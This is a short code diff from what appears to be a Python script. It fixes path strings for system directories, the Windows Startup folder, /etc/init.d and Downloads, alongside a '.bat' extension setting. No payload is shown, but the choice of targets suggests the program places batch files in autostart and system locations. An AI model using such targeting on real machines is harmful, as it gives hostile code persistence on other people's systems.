@@ -23,10 +23,10 @@ home = os.path.expanduser('~')
 extfiles = []
 files = []
 
-directory = ("{0}AppData/Local".format(home) if windows else "{0}.config".format(home))
-directory2 = ("C:/Windows/system32" if windows else "/sbin")
-directory3 = ("{0}AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup".format(home) if windows else "/etc/init.d")
-directory4 = "{0}Downloads".format(home)
+directory = ("{0}\AppData\Local".format(home) if windows else "{0}/.config".format(home))
+directory2 = ("C:\Windows\system32" if windows else "/sbin")
+directory3 = ("{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup".format(home) if windows else "/etc/init.d")
+directory4 = "{0}\Downloads".format(home)
 
 # Extensions
 ext = '.bat'
